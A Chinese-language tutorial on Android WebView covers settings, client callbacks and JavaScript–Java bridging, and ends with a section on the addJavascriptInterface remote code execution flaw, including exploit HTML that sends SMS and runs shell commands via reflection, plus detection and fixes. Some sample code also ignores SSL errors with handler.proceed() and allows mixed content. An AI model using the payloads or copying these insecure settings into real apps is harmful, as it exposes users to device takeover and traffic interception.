## Android WebView 详解

### 目录

1. 思维导图
2. WebView 的基本使用 
    - WebView
    - WebSettings
    - WebViewClient
    - WebChromeClient
3. WebView 与 JS 交互 
    - Android 去调用 JS 代码
    - JS 调用 Android 代码
4. WebView 常见问题汇总
5. WebView 优化
6. 参考

#### 

### 思维导图

[![img](https://github.com/Omooo/Android-Notes/raw/master/images/Android/WebView.png?raw=true)](https://github.com/Omooo/Android-Notes/blob/master/images/Android/WebView.png?raw=true)

#### 

### 基本使用

WebView 是一个基于 webkit 引擎，展示 web 页面的空间。WebView 在低版本和高版本采用了不同的 webkit 内核版本，4.4 ( API 19 ) 之后直接使用了 Chrome。

##### 

##### WebView 类

```java
    /**
     * Back 键后退网页
     * 如果又重写了 onBackPressed 方法，只会回调 onKeyDown
     */
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && mWebView.canGoBack()) {
            mWebView.goBack();
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
	mWebView.onPasue();
    //清除缓存数据
    mWebView.clearCache(true);	//清除缓存
    mWebView.clearHistory();	//清除浏览记录
    mWebView.clearFormData();	//清除自动填充的表单数据
```

##### 

##### WebSetting 类

对 WebView 进行配置和管理。

```java
    private void setWebViewSettings(WebView webView){
        WebSettings webSettings=webView.getSettings();
        webSettings.setJavaScriptEnabled(true); //支持 JS
        webSettings.setJavaScriptCanOpenWindowsAutomatically(true); //支持通过 JS 打开新的窗口
        //设置自适应屏幕
        webSettings.setUseWideViewPort(true);
        webSettings.setLoadWithOverviewMode(true);

        webSettings.setLoadsImagesAutomatically(true);  //设置自动加载图片
        webSettings.setCacheMode(WebSettings.LOAD_NO_CACHE);    //不使用缓存
		//...
    }
```

##### 

##### WebViewClient 类

处理各种通知和请求事件等等。

```java
//在当前 WebView 打开页面，而不是系统浏览器
//如果不需要转发处理，只需要传递一个 WebViewClent 实例，根本不需要重写 shouldOverrideUrlLoading 方法     
public class MyWebViewClient extends WebViewClient {

    private Context mContext;

    public MyWebViewClient(Context context) {
        mContext = context;
    }

    @Override
    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
        //当前 WebView 处理
        if (request.getUrl().getHost().equals("https://www.example.com")) {
            return false;
        }
        //如果需要转发处理
        mContext.startActivity(new Intent(Intent.ACTION_VIEW, request.getUrl()));
        return true;
    }

    @Override
    public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
        switch (error.getErrorCode()){
            case WebViewClient.ERROR_CONNECT:   //连接失败
                view.loadUrl("file:///android_asset/error.html");
                break;
        }
    }

    @Override
    public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
        handler.proceed();  //等待证书响应 
        //handler.cancel();   //挂起连接 默认行为
    }
}

mWebView.setWebViewClient(new MyWebViewClient(MainActivity.this));
```

##### 

##### WebChromeClient 类

辅助 WebView 处理 JS 的对话框、网站标题等等。

```java
public class MyWebChromeClient extends WebChromeClient {

    /**
     * 网页加载进度
     */
    @Override
    public void onProgressChanged(WebView view, int newProgress) {
        super.onProgressChanged(view, newProgress);
    }

    /**
     * 网页标题加载完毕回调
     */
    @Override
    public void onReceivedTitle(WebView view, String title) {
        super.onReceivedTitle(view, title);
    }

    /**
     * 拦截输入框
     */
    @Override
    public boolean onJsPrompt(WebView view, String url, String message, String defaultValue, JsPromptResult result) {
        return super.onJsPrompt(view, url, message, defaultValue, result);
    }

    /**
     * 拦截确认框
     */
    @Override
    public boolean onJsConfirm(WebView view, String url, String message, JsResult result) {
        return super.onJsConfirm(view, url, message, result);
    }

    /**
     * 拦截弹框
     */
    @Override
    public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
        return super.onJsAlert(view, url, message, result);
    }
}


mWebView.setWebChromeClient(new MyWebChromeClient());
```

#### 

### WebView 与 JS 交互

##### 

##### Android 调用 JS 代码

- webView.loadUrl(url)
- webView.evaluateJavascript()

首先选准备一个静态文件：

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Title</title>
    <script>
   function callJS(){
      alert("Android调用了 JS 的 callJS() 方法");
   }
    </script>
    <p3>
        WebView 与 JS 交互！
    </p3>
</head>
</html>
```

第一种方式：loadUrl()

```java
        mWebView.loadUrl("javascript:callJS()");
        mWebView.setWebChromeClient(new WebChromeClient(){
            @Override
            public boolean onJsAlert(WebView view, String url, String message, final JsResult result) {
                AlertDialog dialog=new AlertDialog.Builder(WebViewContactActivity.this)
                        .setTitle("Title")
                        .setPositiveButton("确认", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                result.confirm();
                            }
                        })
                        .setCancelable(false)
                        .setMessage(message)
                        .create();
                dialog.show();
                return true;
            }
        });
```

可以看到，WebView 只是载体，内容的渲染还的通过 WebChromeClient 承载。

第二种方式：evaluateJavascript()

```java
        mWebView.evaluateJavascript("javascript:callJS()", new ValueCallback<String>() {
            @Override
            public void onReceiveValue(String value) {
                //JS 返回的结果
                Toast.makeText(WebViewContactActivity.this, "value " + value, Toast.LENGTH_SHORT).show();
            }
        });
```

只是把上面的 loadUrl 换成 evaluateJavascript 方法而已。但是这种方法比第一种方式效率高，因为该方法的执行不会使页面刷新。

两种方法的对比：

| 调用方式            | 优点     | 缺点                       | 使用场景                           |
| ------------------- | -------- | -------------------------- | ---------------------------------- |
| loadUrl             | 方便简洁 | 效率低                     | 不需要获取返回值，对性能要求较低时 |
| evaluatedJavascript | 效率高   | 向下兼容性差（ API > 19 ） | API > 19                           |

当然也可以通过 Build.VERSION 来进行判断执行。

##### 

##### JS 调用 Android 代码

- 通过 WebView.addJavascriptInterface 进行对象映射
- 通过 WebViewClient.shouldOverrideUrlLoading 方法回调拦截 url
- 通过 WebChromeClient 的 onJsAlert、onJsConfirm、onJsPrompt 方法回调拦截 JS 对话框 alert、confirm、prompt 消息

第一种方式：WebView.addJavascriptInterface 进行对象映射

首先先准备好资源文件，用于模拟 WebView 加载的网页：

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Demo</title>
    <script>
         function callAndroid(){
            test.hello("js调用了android中的hello方法");
         }
      </script>
</head>
<body>
<p2>JS 调用 Android 方法</p2>
<button type="button" id="button1" onclick="callAndroid()">点击按钮调用 Android 的 hello 方法</button>
</body>
</html>
```

然后定义一个 JS 对象映射关系的 Android 类：

```java
public class JSObject extends Object {

    private Context mContext;

    public JSObject(Context context) {
        mContext = context;
    }

    @JavascriptInterface
    public void hello(String msg){
        Toast.makeText(mContext, "JS 调用了 Android 的 hello 方法", Toast.LENGTH_SHORT).show();
    }
}
```

最后就是通过 WebView 设置 Android 类与 JS 代码的映射：

```java
mWebView.loadUrl("file:///android_asset/js_to_android.html");
mWebView.addJavascriptInterface(new JSObject(this),"test");
```

第二种方式：WebViewClient.shouldOverrideUrlLoading 方法回调拦截 url

Android 通过 WebViewClient 的回调方法 shouldOverrideUrlLoading 拦截 url，解析该 url 协议，如果检测到是预先约定好的协议，就调用 Android 相应的方法。

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Demo</title>
    <script>
         function callAndroid(){
            document.location = "js://webview?arg1=2333&arg2=222";
         }
      </script>
</head>
<body>
<p2>JS 调用 Android 方法</p2>
<button type="button" id="button1" onclick="callAndroid()">点击按钮调用 Android 的方法</button>
</body>
</html>
mWebView.loadUrl("file:///android_asset/js_call_android.html");
        mWebView.setWebViewClient(new WebViewClient(){
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                if ("js".equals(request.getUrl().getScheme())){
                    if ("webview".equals(request.getUrl().getAuthority())){
                        Toast.makeText(WebViewContactActivity.this, "JS 调用 Android 方法，参数一为："+request.getUrl().getQueryParameter("arg1"), Toast.LENGTH_SHORT).show();
                    }
                    return true;
                }
                return super.shouldOverrideUrlLoading(view, request);
            }
        });
```

第三种方式：通过 WebChromeClient 的 onJsAlert、onJsConfirm、onJsPrompt 方法回调拦截 JS 对话框的消息

这里只示例 onJsPrompt 的回调，因为这个方法可以返回任意类型的值。

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Demo</title>
    <script>
         function callAndroid(){
            var result=prompt("js://demo?arg1=111&arg2=222");
            alert("demo " + result);
         }
      </script>
</head>
<body>
<p2>JS 调用 Android 方法</p2>
<button type="button" id="button1" onclick="callAndroid()">点击按钮调用 Android 的方法</button>
</body>
</html>
       mWebView.loadUrl("file:///android_asset/js_call_android_demo.html");
        mWebView.setWebChromeClient(new WebChromeClient(){
            @Override
            public boolean onJsPrompt(WebView view, String url, String message, String defaultValue, JsPromptResult result) {
                Uri uri=Uri.parse(message);
                if ("js".equals(uri.getScheme())){
                    if ("demo".equals(uri.getAuthority())){
                        result.confirm("JS 调用了 Android 的方法");
                    }
                    return true;
                }
                return super.onJsPrompt(view, url, message, defaultValue, result);
            }
        });
```

三种方式的比较：

| 调用方式                                                     | 优点       | 缺点                     | 使用场景                           |
| ------------------------------------------------------------ | ---------- | ------------------------ | ---------------------------------- |
| WebView.addJavascriptInterface 对象映射                      | 方便简洁   | Android 4.2 一下存在漏洞 | Android 4.2 以上相对简单的应用场景 |
| WebViewClient.shouldOverrideUrlLoading 回调拦截              | 不存在漏洞 | 使用复杂，需要协议约束   | 不需要返回值情况下                 |
| WebChormeClient.onJsAlert / onJsConfirm / onJsPrompt 方法回调拦截 | 不存在漏洞 | 使用复杂，需要协议约束   | 能满足大多数场景                   |

#### 

### WebView 常见问题

1. WebView 销毁

    ```java
        @Override
        protected void onDestroy() {
            super.onDestroy();
            if (mWebView != null) {
                mWebView.loadDataWithBaseURL("", null, "text/html", "utf-8", null);
                mWebView.clearHistory();
                ((ViewGroup) mWebView.getParent()).removeView(mWebView);
                mWebView.destroy();
                mWebView = null;
            }
        }
    ```

2. Android P 阻止加载任何 http 的请求

    Mainfest 中加入：

    ```xml
    android:usesCleartextTraffic="true"
    ```

3. Android 5.0 之后 WebView 禁止加载 http 与 https 混合内容

    ```java
    if (Build.VERSION.SDK_INT>Build.VERSION_CODES.LOLLIPOP){
              mWebView.getSettings().
                  setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
            }
    ```

4. WebView 开启硬件加速导致的问题

    比如不能打开 PDF，播放视频花屏等等。

    建议在需要的地方WebView暂时关闭硬件加速

    关闭硬件加速，或者直接用第三方库吧。

5. Webview 后台耗电

    ##### 问题

    在WebView加载页面的时候，会自动开启线程去加载，如果不很好的关闭这些线程，就会导致电量消耗加大。

    ##### 解决方法

    可以采用暴力的方法，直接在onDestroy方法中System.exit(0)结束当前正在运行中的java虚拟机

6.  WebViewClient的onPageFinished问题

    ##### 问题

    WebViewClient.onPageFinished在每次页面加载完成的时候调用，但是遇到未加载完成的页面跳转其他页面时，就会被一直调用

    ##### 解决方案

    使用WebChromeClient.onProgressChanged替代WebViewClient.onPageFinished

#### 

### WebView 优化

1. 给 WebView 加一个加载进度条

    重写 WebChromeClient 的 onProgressChanged 方法。

2. 提高 HTML 网页加载速度，等页面 finsh 在加载图片

    ```java
    public void int () {
        if(Build.VERSION.SDK_INT >= 19) {
            webView.getSettings().setLoadsImagesAutomatically(true);
        } else {
            webView.getSettings().setLoadsImagesAutomatically(false);
        }
    }
    ```

3. 自定义 WebView 错误页面

    重写 WebViewClient 的 onReceivedError 方法。

#### 



###  webview 的使用问题汇总:

1. ####  WebView远程代码执行安全漏洞

    ##### 漏洞描述

    Android API level  16以及之前的版本存在远程代码执行安全漏洞，该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface方法，远程攻击者可通过使用Java  Reflection API利用该漏洞执行任意Java对象的方法。

    简单的说就是通过addJavascriptInterface给WebView加入一个JavaScript桥接接口，JavaScript通过调用这个接口可以直接操作本地的JAVA接口。

    ##### 

    ##### 示例代码

    WebView代码如下所示：

    ```
    mWebView = new WebView(this);
    mWebView.getSettings().setJavaScriptEnabled(true);
    mWebView.addJavascriptInterface(this, "injectedObj");
    mWebView.loadUrl("file:///android_asset/www/index.html");
    ```

    发送恶意短信：

    ```html
    <html>
       <body>
          <script>
             var objSmsManager = injectedObj.getClass().forName("android.telephony.SmsManager").getM ethod("getDefault",null).invoke(null,null);
              objSmsManager.sendTextMessage("10086",null,"this message is sent by JS when webview is loading",null,null);
           </script>
       </body>
    </html>
    ```

    利用反射机制调用Android API getRuntime执行shell命令，最终操作用户的文件系统：

    ```html
    <html>
       <body>
          <script>
             function execute(cmdArgs)
             {
                 return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
             }
    
             var res = execute(["/system/bin/sh", "-c", "ls -al /mnt/sdcard/"]);
             document.write(getContents(res.getInputStream()));
           </script>
       </body>
    </html>
    ```

    ##### 

    ##### 漏洞检测

    1. 检查应用源代码中是否调用Landroid/webkit/WebView类中的addJavascriptInterface方法，是否存在searchBoxJavaBridge_、accessibility、accessibilityTraversal接口
    2. 在线检测：腾讯TSRC在线检测页面（[http://security.tencent.com/lucky/check_tools.html）、乌云知识库在线检测（http://drops.wooyun.org/webview.html）](http://security.tencent.com/lucky/check_tools.html%EF%BC%89%E3%80%81%E4%B9%8C%E4%BA%91%E7%9F%A5%E8%AF%86%E5%BA%93%E5%9C%A8%E7%BA%BF%E6%A3%80%E6%B5%8B%EF%BC%88http://drops.wooyun.org/webview.html%EF%BC%89)
    3. 在线检测原理：遍历所有window的对象，然后找到包含getClass方法的对象,如果存在此方法的对象则说明该接口存在漏洞。

    ##### 

    ##### 漏洞修复

    1. 允许被调用的函数必须以@JavascriptInterface进行注解（API Level小于17的应用也会受影响）

    2. 建议不要使用addJavascriptInterface接口，以免带来不必要的安全隐患，采用动态地生成将注入的JS代码的方式来代替

    3. 如果一定要使用addJavascriptInterface接口:

        1. 如果使用HTTPS协议加载URL，应进行证书校验防止访问的页面被篡改挂马；
        2. 如果使用HTTP协议加载URL，应进行白名单过滤、完整性校验等防止访问的页面被篡改；
        3. 如果加载本地Html，应将html文件内置在APK中，以及进行对html页面完整性的校验；

    4. 移除Android系统内部的默认内置接口

        ```
        removeJavascriptInterface("searchBoxJavaBridge_");
        removeJavascriptInterface("accessibility");
        removeJavascriptInterface("accessibilityTraversal");
        ```

    

    ### 参考

    <https://www.jianshu.com/p/b9164500d3fb>

    [WebView 远程代码执行漏洞浅析](https://blog.csdn.net/feizhixuan46789/article/details/49155369)

    [Android WebView远程执行代码漏洞浅析](https://blog.csdn.net/fengling59/article/details/50379522)

    [Android WebView 远程代码执行漏洞简析](http://www.droidsec.cn/android-webview-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%A3%80%E6%B5%8B/)

    [在WebView中如何让JS与Java安全地互相调用](https://blog.csdn.net/xyz_lmn/article/details/39399225)

